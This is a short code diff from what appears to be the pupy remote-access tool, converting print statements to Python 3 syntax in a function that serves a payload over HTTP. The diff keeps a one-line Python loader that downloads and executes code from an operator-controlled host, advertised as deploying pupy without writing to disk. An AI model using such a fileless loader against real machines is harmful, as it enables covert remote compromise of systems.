@@ -83,18 +83,18 @@ def serve_payload(payload, ip="0.0.0.0", port=8080, link_ip="<your_ip>"):
                     port+=1
                 else:
                     raise
-        print colorize("[+] ","green") + "copy/paste this one-line loader to deploy pupy without writing on the disk :"
-        print " --- "
+        print(colorize("[+] ","green") + "copy/paste this one-line loader to deploy pupy without writing on the disk :")
+        print(" --- ")
         oneliner = colorize("python -c 'import urllib;exec urllib.urlopen(\"http://%s:%s/index\").read()'"%(link_ip, port), "green")
-        print oneliner
-        print " --- "
-        
-        print colorize("[+] ","green") + 'HTTP server started on {ip}:{port}'.format(ip=ip, port=port)
-        print colorize("[+] ","green") + 'CTCL+C to kill the server'
-        print colorize("[+] ","green") + 'Waiting for a connection ...'
+        print(oneliner)
+        print(" --- ")
+
+        print(colorize("[+] ","green") + 'HTTP server started on {ip}:{port}'.format(ip=ip, port=port))
+        print(colorize("[+] ","green") + 'CTCL+C to kill the server')
+        print(colorize("[+] ","green") + 'Waiting for a connection ...')
         server.serve_forever()
-    
+
     except KeyboardInterrupt:
-        print colorize("[+] ","red") + 'KeyboardInterrupt received, shutting down the web server'
+        print(colorize("[+] ","red") + 'KeyboardInterrupt received, shutting down the web server')
         server.socket.close()
         server.shutdown()
